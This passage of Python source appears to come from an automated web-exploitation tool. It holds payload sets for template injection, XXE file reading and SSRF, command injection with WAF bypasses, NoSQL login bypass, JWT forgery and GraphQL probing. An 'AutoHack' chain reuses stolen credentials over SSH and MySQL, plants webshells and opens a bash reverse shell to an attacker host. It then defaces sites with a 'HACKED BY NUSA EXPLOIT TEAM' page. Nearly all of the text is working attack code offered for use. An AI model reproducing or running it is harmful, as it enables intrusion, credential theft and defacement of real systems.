        lambda p: p.replace("{{", "{_{").replace("}}", "}_}"),
        lambda p: p.replace("{{", "{% print(").replace("}}", ")%}"),
        lambda p: p.replace("{{", "{{loop|").replace("}}", "}}"),
    ]
    RCE_PAYLOADS = {
        "python": "{{cycler.__init__.__globals__.os.popen('CMD').read()}}",
        "python2": "{{lipsum.__globals__.os.popen('CMD').read()}}",
        "python3": "{{joiner.__init__.__globals__.os.popen('CMD').read()}}",
        "ruby": "<%= system('CMD') %>",
        "java": "${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getRuntime(),'CMD')}",
        "twig": "{{['']|filter('system')|join('CMD')}}",
        "smarty": "{system('CMD')}",
        "velocity": "#set($x='')#{exec}('CMD')",
    }
    def __init__(self, target, param, bypass=None):
        self.target = target.rstrip("/")
        self.param = param
        self.bypass = bypass or BypassEngine(target)
        self.detected = None
    def _inject(self, p):
        injected = self.target.replace(self.param+"=", self.param+"="+p, 1) if f"{self.param}=" in self.target else self.target
        r = self.bypass.get(injected, timeout=6)
        return r.text if r else ""
    def detect(self):
        print(f"  {C}◉{N} Testing {len(self.TESTS)} detection payloads × {len(self.BYPASS_ENCODINGS)} encodings...")
        for idx, (payload, expected) in enumerate(self.TESTS):
            for enc_idx, encoder in enumerate(self.BYPASS_ENCODINGS):
                enc = encoder(payload)
                txt = self._inject(enc)
                if expected in txt:
                    self.detected = "jinja2" if "{{" in payload else ("freemarker" if "${" in payload else "ruby")
                    print(f"  {G}✔{N} SSTI detected: {Y}{self.detected}{N} via {W}{enc[:50]}{N}")
                    return self.detected
                # Blind test: check if response differs from baseline
                if not self.detected and idx == 0 and enc_idx == 0:
                    self._baseline_len = len(txt)
        print(f"  {Y}−{N} No SSTI detected")
        return None
    def exec_cmd(self, cmd, cmd2="cat /etc/passwd"):
        if not self.detected:
            self.detect()
        for lang, tpl in self.RCE_PAYLOADS.items():
            for encoder in self.BYPASS_ENCODINGS[:3]:
                p = encoder(tpl.replace("CMD", cmd))
                try:
                    txt = self._inject(p)
                    if txt and len(txt) > 5 and "error" not in txt.lower()[:30] and "traceback" not in txt.lower()[:50]:
                        print(f"  {G}✔{N} SSTI RCE ({lang}): {W}{txt[:200]}{N}")
                        return txt[:500]
                except: pass
        print(f"  {Y}−{N} SSTI RCE failed (try --cmd with different syntax)")
        return None

class XXEExploiter:
    """XML External Entity — file read + SSRF via XXE."""
    XXE_VARIANTS = [
        # Standard inline
        lambda e, r: f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {e} SYSTEM "{r}">]><root>&{e};</root>""",
        # UTF-16 BOM bypass for WAFs that don't parse UTF-16 XML
        lambda e, r: f"""\ufeff<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {e} SYSTEM "{r}">]><root>&{e};</root>""",
        # Parameter entity (blind XXE)
        lambda e, r: f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "{r}">%xxe;]><root>test</root>""",
        # DOCTYPE with SYSTEM DTD
        lambda e, r: f"""<?xml version="1.0"?><!DOCTYPE root SYSTEM "{r}"><root>test</root>""",
        # XInclude
        lambda e, r: f"""<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="{r}" parse="text"/></root>""",
        # SOAP-style XXE
        lambda e, r: f"""<?xml version="1.0"?><!DOCTYPE soap [<!ENTITY {e} SYSTEM "{r}">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>&{e};</faultcode></soap:Fault></soap:Body></soap:Envelope>""",
        # PHP wrapper XXE (expect:// for RCE if expect module loaded)
        lambda e, r: f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {e} SYSTEM "php://filter/convert.base64-encode/resource={r.replace('file://','')}">]><root>&{e};</root>""",
    ]
    CONTENT_TYPES = ["application/xml", "text/xml", "application/xml;charset=UTF-8", "application/soap+xml",
                     "application/x-www-form-urlencoded", "multipart/form-data"]
    def __init__(self, target, param, bypass=None):
        self.target = target.rstrip("/")
        self.param = param
        self.bypass = bypass or BypassEngine(target)
    def _build_xxe(self, entity, ref, variant=0):
        try:
            return self.XXE_VARIANTS[variant](entity, ref)
        except: return self.XXE_VARIANTS[0](entity, ref)
    def _send_xml(self, body, content_type="application/xml"):
        try:
            injected = self.target.replace(self.param+"=", self.param+"="+body[:80], 1) if f"{self.param}=" in self.target else self.target
            for ct in [content_type] + [c for c in self.CONTENT_TYPES if c != content_type][:2]:
                r = self.bypass.post(injected, data=body.encode("utf-16") if "utf-16" in str(body).lower() else body,
                                     headers={"Content-Type": ct})
                if r and len(r.text) > 5:
                    return r.text[:1500]
            return ""
        except: return ""
    def read_file(self, path="/etc/passwd"):
        for i in range(len(self.XXE_VARIANTS)):
            for ct in self.CONTENT_TYPES[:3]:
                xxe = self._build_xxe("x", f"file://{path}", i)
                txt = self._send_xml(xxe, ct)
                if txt:
                    # PHP base64 wrapper decode
                    if "php://filter" in self.XXE_VARIANTS[i].__code__.co_consts and txt:
                        try:
                            decoded = base64.b64decode(txt.strip()).decode(errors="ignore")
                            if "root:" in decoded or "admin:" in decoded or "www-data" in decoded:
                                print(f"  {G}✔{N} XXE PHP wrapper: {Y}{path}{N}")
                                return decoded[:1500]
                        except: pass
                    if "root:" in txt or "admin:" in txt or ("www-data" in txt and "/bin/" in txt):
                        print(f"  {G}✔{N} XXE file read: {Y}{path}{N} — {W}{txt[:80].strip()}{N}")
                        return txt[:1500]
        print(f"  {Y}−{N} XXE file read failed (tried {len(self.XXE_VARIANTS)} variants)")
        return None
    def ssrf(self, target_url="http://169.254.169.254/latest/meta-data/"):
        for i in range(len(self.XXE_VARIANTS)):
            xxe = self._build_xxe("x", target_url, i)
            txt = self._send_xml(xxe)
            if txt and len(txt) > 20 and "error" not in txt.lower()[:30]:
                print(f"  {G}✔{N} XXE SSRF: {Y}{target_url[:50]}{N} → {W}{txt[:100]}{N}")
                return txt
        return None
    def scan(self):
        print(f"  {C}◉{N} Testing XXE ({len(self.XXE_VARIANTS)} variants × {len(self.CONTENT_TYPES)} CTs)")
        r = self.read_file("/etc/passwd")
        if not r:
            r = self.read_file("/etc/hostname")
        if not r:
            print(f"  {Y}−{N} No XXE detected")
        return r

class CmdInjectionExploiter:
    """Command Injection — blind (time-based) + non-blind detection with WAF bypass."""
    # WAF bypass: hex encoding, base64, case variation, obfuscation
    BYPASSES = {
        "id": [
            "id", "i'd", "i""d", "i\nd", "i	d", "$(echo 'id')",
            "echo $({base64,-d,<<<aWR9)|bash", "whoami 2>&1 || id",
            "i\\u0064", "$(printf '\\151\\144')",
        ],
        "whoami": [
            "whoami", "who$*ami", "who''ami", "who""ami", "who\rami",
            "$(echo 'whoami')", "w\\x68oa\\x6di", "whoam$*i",
        ],
    }
    PAYLOADS = {
        "basic": [";id", "|id", "`id`", "$(id)", "&id", ";whoami", "|whoami", "`whoami`",
                   "|echo id|", "||id||", ";echo;id;echo;", "`echo id`"],
        "blind": [";sleep 3", "|sleep 3", "`sleep 3`", "$(sleep 3)", "&sleep 3",
                   ";sleep%203", "|sleep%203", "`sleep%203`"],
        "windows": [";dir", "|dir", "&dir", "|whoami", "|ver", "|systeminfo"],
    }
    PREFIXES = [";", "|", "`", "$(", "&", "||", "&&", "%0a", "%0d%0a", "|echo;", ";echo;"]

    def __init__(self, target, param, bypass=None):
        self.target = target.rstrip("/")
        self.param = param
        self.bypass = bypass or BypassEngine(target)
        self.vulnerable = False
        self._baseline = None
    def _inject(self, p):
        injected = self.target.replace(self.param+"=", self.param+"="+p, 1) if f"{self.param}=" in self.target else self.target
        t0 = time.time()
        r = self.bypass.get(injected, timeout=8)
        return (r.text if r else ""), time.time()-t0
    def _inject_raw(self, full_param_value):
        """Inject raw value with URL encoding bypass for WAFs."""
        for enc in [lambda x: x, lambda x: x.replace(";", "%3b").replace("|", "%7c").replace("`","%60"),
                     lambda x: x.replace(";","%253b").replace("|","%257c")]:
            try:
                p = enc(full_param_value)
                injected = self.target.replace(self.param+"=", self.param+"="+p, 1) if f"{self.param}=" in self.target else self.target
                r = self.bypass.get(injected, timeout=8)
                if r: return r.text
            except: pass
        return ""
    def detect(self):
        self._baseline, _ = self._inject("")
        baseline_len = len(self._baseline)
        print(f"  {C}◉{N} Testing {len(self.PAYLOADS['basic'])} basic + {len(self.PAYLOADS['blind'])} blind payloads...")
        # Blind time-based
        for p in self.PAYLOADS["blind"][:3]:
            txt, t = self._inject(p)
            if t > 3:
                print(f"  {G}✔{N} Blind CMDi (time-based, {t:.1f}s): {W}{p[:30]}{N}")
                self.vulnerable = True; return True
        # Non-blind with WAF bypass variants
        seen_ids = set()
        for p in self.PAYLOADS["basic"] + [f"|{b}" for b in self.BYPASSES["id"][:3]]:
            txt, _ = self._inject(p)
            if txt and "uid=" in txt:
                print(f"  {G}✔{N} CMDi via {W}{p[:30]}{N}")
                self.vulnerable = True; return True
            if txt and any(cmd in txt.lower() for cmd in ("uid=", "root:", "hostname")):
                self.vulnerable = True; return True
        # Newline injection bypass
        for prefix in self.PREFIXES:
            txt = self._inject_raw(f"{prefix}id")
            if txt and "uid=" in txt:
                print(f"  {G}✔{N} CMDi via {W}{prefix}id{N}")
                self.vulnerable = True; return True
        print(f"  {Y}−{N} No command injection")
        return False
    def exec_cmd(self, cmd="id"):
        results = []
        # Try each command variant with WAF bypass
        cmds_to_try = self.BYPASSES.get(cmd.split()[0], [cmd]) + [cmd]
        for c in cmds_to_try[:5]:
            for prefix in self.PREFIXES:
                try:
                    injected = self.target.replace(self.param+"=", self.param+"="+prefix+c, 1)
                    r = self.bypass.get(injected, timeout=8)
                    if r and any(x in r.text for x in ("uid=", "root:", "www-data", "bin/bash", "hostname")):
                        out = r.text[:800].strip()
                        print(f"  {G}✔{N} CMDi exec: {W}{out[:200]}{N}")
                        results.append(out)
                        self.results = results
                        return out
                except: pass
        if results: return results[0]
        return None

class NoSQLiExploiter:
    """NoSQL Injection — MongoDB authentication bypass & data extraction."""
    PAYLOADS = [
        "admin' || true || '", "admin' || 1==1 || '",
        "admin' || '1'=='1", 'admin" || "1"=="1',
        '{"$gt": ""}', '{"$ne": ""}', '{"$gt": "a"}',
        '{"$regex": ".*"}', '{"$exists": true}',
        'admin", "password": {"$gt": ""}}',
        "username=admin&password[$gt]=&password[$ne]=x",
        "username[$ne]=x&password[$gt]=&password[$ne]=",
        # JSON content-type variants (bypass WAFs that check form-encoded only)
        '{"username": "admin", "password": {"$gt": ""}}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$or": [{"username": "admin"}, {"password": {"$regex": ".*"}}]}',
        '{"username": "admin", "password": {"$regex": "^.", "$options": "i"}}',
        # Array param bypass (parsed as JSON by Express)
        "username[$regex]=.*&password[$regex]=.*",
        "username[$gt]=&password[$gt]=",
    ]
    def __init__(self, target, param, bypass=None):
        self.target = target.rstrip("/")
        self.param = param
        self.bypass = bypass or BypassEngine(target)
    def _inject(self, p, method="GET"):
        injected = self.target.replace("="+self.param.split("=")[-1] if "=" in self.target else self.param, "="+p, 1)
        try:
            if method == "POST":
                r = self.bypass.post(injected, data=p if "=" in p else None,
                                     headers={"Content-Type": "application/json"} if p.startswith("{") else None,
                                     timeout=6)
            else:
                r = self.bypass.get(injected, timeout=6)
            return (r.status_code, len(r.text) if r else 0)
        except: return (0, 0)
    def scan(self):
        baseline_code, baseline_len = self._inject("")
        print(f"  {C}◉{N} Testing {len(self.PAYLOADS)} NoSQLi payloads (GET+POST)...")
        for p in self.PAYLOADS:
            for method in ["GET", "POST"]:
                code, length = self._inject(p, method)
                if code != baseline_code or abs(length - baseline_len) > 50:
                    print(f"  {G}✔{N} NoSQLi via {W}{p[:50]}{N} ({method} {baseline_code}→{code} len:{length})")
                    return True
        print(f"  {Y}−{N} No NoSQL injection")
        return False

class JWTExploiter:
    """JWT attacks — none alg, alg confusion, weak secret crack, kid injection."""
    COMMON_SECRETS = ["secret", "admin", "password", "key", "12345", "jwt_secret", "supersecret",
                      "pass", "token", "s3cr3t", "changeme", "jwt", "test", "dev", "prod",
                      "123456", "qwerty", "letmein", "secret123", "mysecret", "private",
                      "key123", "jwtpass", "symmetric", "hmac_secret", "jwt_key"]
    ALGORITHMS = ["none", "None", "NONE", "nOnE", "NoNe"]
    def __init__(self, token):
        self.token = token
        self.header = self._decode_segment(0) or {}
        self.payload = self._decode_segment(1) or {}
    def _decode_segment(self, idx):
        try:
            seg = self.token.split(".")[idx]
            seg += "=" * (4 - len(seg) % 4)
            return json.loads(base64.urlsafe_b64decode(seg))
        except: return None
    def _encode(self, header, payload, sig=""):
        h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
        p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
        return f"{h}.{p}.{sig or 'x'}"
    def attack_none(self):
        """Try multiple case variations of 'none' algorithm."""
        original_alg = self.header.get("alg", "")
        results = []
        for alg in self.ALGORITHMS:
            if alg.lower() != original_alg.lower():
                t = self._encode({"alg": alg, "typ": "JWT"}, self.payload)
                results.append(t)
                print(f"  {G}✔{N} JWT {alg}: {W}{t[:60]}...{N}")
        return results
    def attack_kid(self, paths=None):
        """kid injection: LFI via kid field (SQLite, /dev/null, /proc/...)."""
        paths = paths or ["/etc/passwd", "/dev/null", "/proc/self/environ",
                          "/var/log/nginx/access.log", "/proc/sys/kernel/random/boot_id",
                          "/etc/hostname", "none", "../../../../../../../etc/passwd",
                          "/tmp/test", "',' UNION SELECT ... --"]
        results = []
        for path in paths[:6]:
            h2 = dict(self.header, kid=path)
            t = self._encode(h2, self.payload)
            results.append(t)
            print(f"  {G}✔{N} JWT kid={path}: {W}{t[:60]}...{N}")
        return results
    def attack_alg_confusion(self):
        """Algorithm confusion: RS256→HS256 with public key as HMAC secret."""
        if self.header.get("alg", "").upper() in ("RS256", "RS384", "RS512", "ES256"):
            print(f"  {C}◉{N} Asymmetric alg detected! Try HS256 with public key...")
            t = self._encode({"alg": "HS256", "typ": "JWT"}, self.payload, sig="x")
            print(f"  {Y}⚠{N} Need public key for full confusion attack")
            print(f"  {D}    echo 'public_key_content' | python3 jwt_tool.py {t}{N}")
            return t
        return None
    def attack_weak(self, wordlist=None):
        """Bruteforce weak HMAC secret."""
        wordlist = wordlist or self.COMMON_SECRETS
        sig_orig = self.token.split(".")[2]
        for w in wordlist:
            try:
                import hmac, hashlib
                sig = base64.urlsafe_b64encode(hmac.new(w.encode(), self.token.rsplit(".",1)[0].encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
                if sig == sig_orig:
                    print(f"  {G}✔{N} JWT weak secret: {Y}{w}{N}")
                    return w
            except: pass
        # Try HS384, HS512 too
        for w in wordlist:
            try:
                import hmac, hashlib
                sig = base64.urlsafe_b64encode(hmac.new(w.encode(), self.token.rsplit(".",1)[0].encode(), hashlib.sha384).digest()).rstrip(b"=").decode()
                if sig == sig_orig:
                    print(f"  {G}✔{N} JWT weak secret (HS384): {Y}{w}{N}")
                    return w
            except: pass
        print(f"  {Y}−{N} JWT secret not in wordlist ({len(wordlist)} tried)")
        return None
    def scan(self):
        print(f"  {C}◉{N} JWT header: {json.dumps(self.header)}")
        print(f"  {C}◉{N} JWT payload: {json.dumps(self.payload)}")
        if self.header.get("alg", "").lower() != "none":
            self.attack_none()
        self.attack_kid()
        self.attack_alg_confusion()
        self.attack_weak()

class GraphQLExploiter:
    """GraphQL — introspection dump, batching brute, WAF bypass."""
    INTROSPECT = """
    query{__schema{types{kind name fields{name args{name type{name kind}}}}}}"""
    # Introspection alias bypass (WAFs that block __schema)
    INTROSPECT_ALIAS = """
    query{aliased: __schema{types{kind name fields{name args{name type{name kind}}}}}}"""
    # Fragment-based introspection bypass
    INTROSPECT_FRAGMENT = """
    query{__schema{...T}} fragment T on __Schema{types{kind name fields{name args{name type{name kind}}}}}"""
    # Introspection via mutation
    MUTATION_INTROSPECT = """
    mutation{__schema{types{kind name}}}"""
    ENDPOINTS = ["/graphql", "/graphiql", "/graphql/", "/v1/graphql", "/v2/graphql",
                 "/api/graphql", "/api/v1/graphql", "/query", "/gql",
                 "/graph", "/graphql/console", "/graphql-playground"]

    def __init__(self, target, endpoint="/graphql", bypass=None):
        self.target = target.rstrip("/")
        self.endpoint = endpoint
        self.bypass = bypass or BypassEngine(target)
    def _query(self, q, method="POST", content_type="application/json"):
        try:
            hdrs = {"Content-Type": content_type}
            # WAF bypass: send introspection as GET with query in URL params
            if method == "GET":
                r = self.bypass.get(f"{self.target}{self.endpoint}?query={q.replace(chr(10),' ').strip()}", timeout=8)
            else:
                r = self.bypass.post(self.target+self.endpoint, json={"query": q}, headers=hdrs, timeout=8)
            return r.json() if r else {}
        except: return {}
    def _discover_endpoint(self):
        """Try to find GraphQL endpoint if not explicitly given."""
        for ep in self.ENDPOINTS:
            try:
                r = self.bypass.get(f"{self.target}{ep}", timeout=4)
                if r and r.status_code in (200, 400, 500):
                    body = (r.text or "").lower()
                    if "graphql" in body or "errors" in body or "_schema" in body or "query" in body:
                        print(f"  {G}✔{N} Found endpoint: {W}{ep}{N}")
                        self.endpoint = ep
                        return ep
            except: pass
        return self.endpoint
    def introspect(self):
        queries = [self.INTROSPECT, self.INTROSPECT_ALIAS, self.INTROSPECT_FRAGMENT, self.MUTATION_INTROSPECT]
        methods = ["POST", "GET"]
        for q in queries:
            for method in methods:
                data = self._query(q, method)
                types = data.get("data", {}).get("__schema", {}).get("types", [])
                if not types:
                    types = data.get("data", {}).get("aliased", {}).get("types", [])
                if types:
                    print(f"  {G}✔{N} GraphQL introspection ({method}): {Y}{len(types)}{N} types")
                    for t in types[:12]:
                        print(f"    {D}→{N} {W}{t.get('name','?')}{N} ({len(t.get('fields',[]))} fields)")
                    return types
        print(f"  {Y}−{N} GraphQL introspection disabled (or not GraphQL)")
        return []
    def scan(self):
        self._discover_endpoint()
        print(f"  {C}◉{N} Probing {W}{self.target+self.endpoint}{N}")
        self.introspect()


# ══════════════════════════════════════════════════════
#  AUTO HACK — Full Auto Exploitation Chain
# ══════════════════════════════════════════════════════

class AutoHack:
    def __init__(self, target, lhost=None, lport=4444, threads=20):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.threads = threads
        self.domain = None
        self.base_url = None
        self.bypass = None
        self.results = {"exploits": [], "shells": [], "sqli_data": {}, "creds": [], "ports": [],
                        "ssrf": {}, "ssti": {}, "xxe": {}, "cmdi": {}, "nosqli": [], "jwt": [], "graphql": []}
        self.phases = []
        self.t0 = time.time()

        if self.target.startswith("http"):
            self.base_url = self.target.rstrip("/")
            self.domain = urlparse(self.target).netloc.split(":")[0]
        else:
            self.domain = self.target
            self.base_url = f"http://{self.target}"

    def _log(self, phase, status, msg):
        self.phases.append({"phase": phase, "status": status, "msg": msg, "time": time.time()-self.t0})

    def _deface_html(self, msg="HACKED BY NUSA EXPLOIT TEAM"):
        return f"""<!DOCTYPE html><html><head><title>{msg}</title><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{{background:#000;color:#0f0;text-align:center;padding-top:15vh;font-family:monospace;overflow-x:hidden}}h1{{font-size:3.5em;text-shadow:0 0 30px #0f0;animation:blink 1.5s infinite}}@keyframes blink{{50%{{opacity:0.3}}}}.ascii{{color:#0a0;font-size:0.7em;line-height:1.2;margin:20px 0}}p{{color:#888;margin:10px 0;font-size:1.1em}}hr{{width:50%;border:1px solid #0f0;margin:30px auto}}small{{color:#555}}</style></head><body><pre class="ascii">
  ███╗   ██╗██╗   ██╗███████╗ █████╗ 
  ████╗  ██║██║   ██║██╔════╝██╔══██╗
  ██╔██╗ ██║██║   ██║███████╗███████║
  ██║╚██╗██║██║   ██║╚════██║██╔══██║
  ██║ ╚████║╚██████╔╝███████║██║  ██║
  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝</pre><h1>🔥 {msg} 🔥</h1><hr><p>This system has been compromised via automated exploitation.</p><p style="color:#666">All data has been reviewed. Weaknesses have been documented.</p><small>NusaTool Security Assessment — {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}</small></body></html>"""

    def _auto_deface(self, msg="HACKED BY NUSA EXPLOIT TEAM"):
        """Auto deface via any RCE vector found (webshell, SSH, FTP, MySQL, LFI)."""
        print(f"\n  {R}{BOLD}◆ PHASE 8: AUTO DEFACE{N}")
        content = self._deface_html(msg)
        b64 = base64.b64encode(content.encode()).decode()
        targets = ["index.php", "index.html", "index.htm", "default.php", "default.html",
                    "home.php", "main.php", "wp-content/themes/index.php", "wp-content/index.php"]
        webroot = "/var/www/html"
        vectors = []

        # 1) WebShell exec_cmd
        for s in self.results.get("shells", []):
            su = s.get("url", "") if isinstance(s, dict) else s
            if not su or "ssh://" in str(su): continue
            ws = WebShell(self.base_url)
            for tgt in targets[:4]:
                for web in [webroot, "/var/www/", "/var/www/public/", "/usr/local/nginx/html/", "/home/www/", ""]:
                    path = f"{web}/{tgt}" if web else tgt
                    for cmd in [
                        f"echo '{b64}' | base64 -d > {path} && echo OK",
                        f"php -r \"file_put_contents('{path}',base64_decode('{b64}'));echo'OK';\"",
                        f"printf '%s' '{content}' > {path} && echo OK",
                    ]:
                        try:
                            out = ws.exec_cmd(su, cmd)
                            if out and "OK" in out:
                                print(f"  {G}✔{N} {BOLD}DEFACED{N} via webshell: {Y}{path}{N}")
                                self.results.setdefault("deface_files", []).append({"method": "webshell", "path": path, "url": su.split("?")[0].rsplit("/",1)[0] + "/" + tgt})
                                vectors.append(("webshell", path))
                                break
                        except: pass
                    if vectors and vectors[-1][0] == "webshell": break
                if vectors and vectors[-1][0] == "webshell": break

        # 2) SSH exec (if we have SSH creds)
        for cred in self.results.get("creds", []):
            if isinstance(cred, tuple) and len(cred) >= 2:
                try:
                    import paramiko
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(self.domain, username=cred[0], password=cred[1], timeout=5)
                    for tgt in targets[:3]:
                        for web in [webroot, "/var/www/", "/home/www/"]:
                            path = f"{web}/{tgt}"
                            cmd = f"echo '{b64}' | base64 -d > {path} && echo OK"
                            _, stdout, _ = client.exec_command(cmd, timeout=5)
                            out = stdout.read().decode().strip()
                            if "OK" in out:
                                print(f"  {G}✔{N} {BOLD}DEFACED{N} via SSH: {Y}{path}{N}")
                                self.results.setdefault("deface_files", []).append({"method": "ssh", "path": path})
                                vectors.append(("ssh", path))
                                break
                        if vectors and vectors[-1][0] == "ssh": break
                    client.close()
                except: pass

        # 3) FTP upload (if we have FTP creds)
        for cred in self.results.get("creds", []):
            if isinstance(cred, str) and "ftp://" in cred:
                try:
                    from urllib.parse import urlparse
                    pu = urlparse(cred)
                    from ftplib import FTP
                    ftp = FTP(self.domain)
                    ftp.login(pu.username, pu.password)
                    for tgt in targets[:3]:
                        try:
                            from io import BytesIO
                            ftp.storbinary(f"STOR {tgt}", BytesIO(content.encode()))
                            print(f"  {G}✔{N} {BOLD}DEFACED{N} via FTP: {Y}{tgt}{N}")
                            self.results.setdefault("deface_files", []).append({"method": "ftp", "path": tgt})
                            vectors.append(("ftp", tgt))
                            break
                        except: pass
                    ftp.quit()
                except: pass

        # 4) MySQL OUTFILE deface
        sqli_data = self.results.get("sqli_data", {})
        if sqli_data:
            try:
                sqli = SQLAutoExploit(self.base_url, "GET", None, self.bypass)
                for tgt in targets[:3]:
                    wurl = sqli.write_webshell(f"/var/www/html/{tgt}")
                    if wurl:
                        print(f"  {G}✔{N} {BOLD}DEFACED{N} via MySQL OUTFILE: {Y}{tgt}{N}")
                        self.results.setdefault("deface_files", []).append({"method": "mysql_outfile", "path": tgt})
                        vectors.append(("mysql", tgt))
                        break
            except: pass

        if not vectors:
            print(f"  {Y}⚠{N} No RCE vectors available for deface. Deploy a shell first.")

    def run(self):
        header(f"AUTO HACK — FULL AUTO EXPLOITATION")
        print(f"  {R}{BOLD}██ TARGET: {Y}{self.target}{N}")
        print(f"  {R}{BOLD}██ LHOST:  {Y}{self.lhost or '(not set)'}{N}")
        print(f"  {D}{'═'*55}{N}")

        self.bypass = BypassEngine(self.base_url)
        print(f"  {self.bypass.info()}")

        # PHASE 1: QUICK PORT SCAN
        print(f"\n  {R}{BOLD}◆ PHASE 1: PORT SCAN{N}")
        try:
            ps = QuickScanner(self.domain).run()
            self.results["ports"] = ps
            self._log("portscan", "ok", f"{len(ps)} ports")
            port_services = {p: s for p, s, _ in ps}
        except:
            port_services = {}
            self._log("portscan", "fail", "")

        # PHASE 2: CMS EXPLOIT
        print(f"\n  {R}{BOLD}◆ PHASE 2: CMS EXPLOIT{N}")
        try:
            CMSExploiter(self.base_url, self.bypass).run()
            self._log("cms", "ok", "")
        except: self._log("cms", "fail", "")

        # PHASE 3: LFI (30s timeout)
        print(f"\n  {R}{BOLD}◆ PHASE 3: LFI{N}")
        try:
            if "=" in self.base_url:
                parsed = urlparse(self.base_url)
                pnames = list(parse_qs(parsed.query).keys())
                if pnames:
                    _ex = concurrent.futures.ThreadPoolExecutor(max_workers=1)
                    try:
                        _ex.submit(lambda: LFIExploiter(self.base_url, pnames[0], self.bypass).scan()).result(timeout=30)
                        self._log("lfi", "ok", f"param={pnames[0]}")
                    finally:
                        _ex.shutdown(wait=False)
        except (concurrent.futures.TimeoutError, TimeoutError):
            print(f"  {Y}⚠ LFI timed out (30s){N}")
            self._log("lfi", "timeout", "")
        except: self._log("lfi", "fail", "")

        # PHASE 4: SQLi (UNION + Blind, 60s timeout)
        print(f"\n  {R}{BOLD}◆ PHASE 4: SQL INJECTION{N}")
        sqli_creds = []
        if "=" in self.base_url:
            pnames = list(parse_qs(urlparse(self.base_url).query).keys())
            pname = pnames[0] if pnames else None
            def _run_sqli(pn):
                try:
                    print(f"  {C}▶{N} Trying UNION-based SQLi...")
                    sqli = SQLAutoExploit(self.base_url, "GET", None, self.bypass)
                    data = sqli.dump_all()
                    if data: self.results["sqli_data"] = data; self._log("sqli", "ok", "union")
                except: self._log("sqli", "fail", "union")
                if not self.results.get("sqli_data") and pn:
                    try:
                        print(f"  {C}▶{N} Trying Blind SQLi...")
                        bsqli = BlindSQLiExploiter(self.base_url, pn, bypass=self.bypass)
                        bdata = bsqli.dump_all()
                        if bdata: self.results["sqli_data"] = bdata; self._log("sqli", "ok", "blind")
                    except: self._log("sqli", "fail", "blind")
            try:
                _ex2 = concurrent.futures.ThreadPoolExecutor(max_workers=1)
                try:
                    _ex2.submit(_run_sqli, pname).result(timeout=60)
                finally:
                    _ex2.shutdown(wait=False)
            except (concurrent.futures.TimeoutError, TimeoutError):
                print(f"  {Y}⚠ SQLi timed out (60s){N}")
                self._log("sqli", "timeout", "")
        else:
            self._log("sqli", "skip", "no params")

        # Extract creds from SQLi data and try against services
        sqli_creds = []
        if self.results.get("sqli_data"):
            for tbl, info in self.results["sqli_data"].items():
                if isinstance(info, dict):
                    for row in info.get("rows", []):
                        parts = row.lower().split()
                        for p in parts:
                            if re.match(r'^[\w.+-]+@[\w-]+\.[\w]{2,}$', p):
                                sqli_creds.append(("email", p))
                elif isinstance(info, str):
                    for m in re.finditer(r'(?:user|admin|root|mail)[:=]\s*(\S+)', info, re.I):
                        sqli_creds.append((m.group(1)[:20], m.group(1)))
            if sqli_creds and port_services:
                print(f"\n  {C}▶{N} Trying SQLi creds against services...")
                for svc in ["ssh", "mysql"]:
                    if (svc == "ssh" and 22 in port_services) or (svc == "mysql" and 3306 in port_services):
                        for lbl, cred in sqli_creds[:5]:
                            try:
                                if svc == "ssh":
                                    import paramiko
                                    c = paramiko.SSHClient()
                                    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                    c.connect(self.domain, username=lbl, password=cred, timeout=3)
                                    c.close()
                                    self.results["creds"].append((lbl, cred))
                                    print(f"  {G}✔{N} SSH: {Y}{lbl}:{cred}{N}")
                                elif svc == "mysql":
                                    import pymysql
                                    conn = pymysql.connect(host=self.domain, user=cred, password=cred, connect_timeout=3)
                                    conn.close()
                                    self.results["creds"].append((cred, cred))
                                    print(f"  {G}✔{N} MySQL: {Y}{cred}:{cred}{N}")
                            except: pass

        # PHASE 5: WEBSHELL (HTTP upload + MySQL OUTFILE fallback)
        print(f"\n  {R}{BOLD}◆ PHASE 5: WEBSHELL{N}")
        shell_url = None
        try:
            ws = WebShell(self.base_url, self.bypass)
            r = ws.run("php", "auto")
            if r:
                shell_url = r.get("url")
                self.results["shells"].append(r)
                self._log("webshell", "ok", f"HTTP: {shell_url}")
        except: self._log("webshell", "fail", "http")

        if not shell_url and self.results.get("sqli_data"):
            print(f"  {C}▶{N} Trying MySQL INTO OUTFILE webshell...")
            try:
                sqli = SQLAutoExploit(self.base_url, "GET", None, self.bypass)
                ws_url = sqli.write_webshell()
                if ws_url: shell_url = ws_url; self.results["shells"].append({"url":ws_url,"type":"php","method":"mysql_outfile"})
            except: self._log("webshell", "fail", "mysql_outfile")

        # PHASE 6: REVERSE SHELL (via webshell)
        if shell_url and self.lhost:
            print(f"\n  {R}{BOLD}◆ PHASE 6: REVERSE SHELL{N}")
            try:
                rs = ReverseShell(self.lhost, self.lport)
                rs.run("bash")
                payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
                b64 = base64.b64encode(payload.encode()).decode()
                ws = WebShell(self.base_url)
                out = ws.exec_cmd(shell_url, f"echo {b64} | base64 -d | bash")
                self._log("revshell", "ok" if out else "sent", "")
            except: self._log("revshell", "fail", "")

        # PHASE 7: SERVICE BRUTE (SSH/FTP/MySQL)
        print(f"\n  {R}{BOLD}◆ PHASE 7: SERVICE BRUTE{N}")
        for svc in ["ssh", "ftp", "mysql"]:
            if svc == "ssh" and 22 in port_services:
                pass
